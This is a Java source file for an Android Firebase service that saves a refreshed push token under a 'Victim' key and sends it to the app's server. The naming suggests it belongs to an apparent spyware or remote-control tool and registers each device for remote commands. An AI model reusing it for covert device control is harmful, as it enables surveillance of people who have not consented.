package com.theah64.xrob.services.firebase;

import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.FirebaseInstanceIdService;
import com.theah64.xrob.models.Victim;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.PrefUtils;
import com.theah64.xrob.utils.APIRequestGateway;

import org.json.JSONException;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

public class InstanceIdService extends FirebaseInstanceIdService {

    private static final String X = InstanceIdService.class.getSimpleName();

    @Override
    public void onTokenRefresh() {

        final String newFcmId = FirebaseInstanceId.getInstance().getToken();
        Log.i(X, "Firebase token refreshed : " + newFcmId);

        final PrefUtils prefUtils = PrefUtils.getInstance(this);

        prefUtils.getEditor()
                .putString(Victim.KEY_FCM_ID, newFcmId)
                .putBoolean(PrefUtils.IS_FCM_SYNCED, false)
                .commit();

        new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
            @Override
            public void onReadyToRequest(String apiKey) {

                final Request fcmUpdateRequest = new APIRequestBuilder("/update/fcm", apiKey)
                        .addParam(Victim.KEY_FCM_ID, newFcmId)
                        .build();

                OkHttpUtils.getInstance().getClient().newCall(fcmUpdateRequest).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        e.printStackTrace();
                    }

                    @Override
                    public void onResponse(Call call, Response response) throws IOException {
                        try {
                            new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                        } catch (JSONException | APIResponse.APIException e) {
                            e.printStackTrace();
                        }
                    }
                });

            }
        }).execute();
    }
}
